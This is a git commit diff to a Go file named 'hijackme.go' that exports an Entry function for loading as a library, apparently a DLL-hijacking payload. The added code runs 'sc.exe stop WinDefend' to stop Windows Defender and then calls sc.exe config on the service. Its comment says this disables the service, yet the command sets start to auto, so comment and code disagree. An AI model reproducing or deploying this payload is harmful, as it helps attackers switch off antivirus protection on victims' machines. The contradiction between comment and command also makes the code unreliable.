6dad72685df909b8567562ed4f348a158b47a6f7
arnoudx6 <arnoud.stolk@ziggo.nl>
2022-11-07 20:15:40 +0100

    Commit

--- hijackme/hijackme.go
+++ hijackme/hijackme.go
@@ -2,13 +2,40 @@ package main
 
 import (
 	"C"
+	"log"
+	"os/exec"
+	"time"
 )
 
 //export Entry
 func Entry() {
+	//This function is exported because of the comment above. The main function is not exported but called from this public functin.
 	main()
 }
 
 func main() {
-	// do something
+	//First stop service
+	println("Stopping the service")
+	cmd1 := exec.Command("sc.exe", "stop", "WinDefend")
+	err1 := cmd1.Run()
+
+	if err1 != nil {
+		log.Fatal(err1)
+	}
+
+	//Wait for the service to stop
+	time.Sleep(5 * time.Second)
+
+	println("disabling the service")
+
+	//Now disabling the service
+	cmd2 := exec.Command("sc.exe", "config", "WinDefend", "start=", "auto")
+	err2 := cmd2.Run()
+
+	if err2 != nil {
+		log.Fatal(err2)
+	}
+
+	//Final sleep for debugging purpose
+	time.Sleep(3 * time.Second)
 }
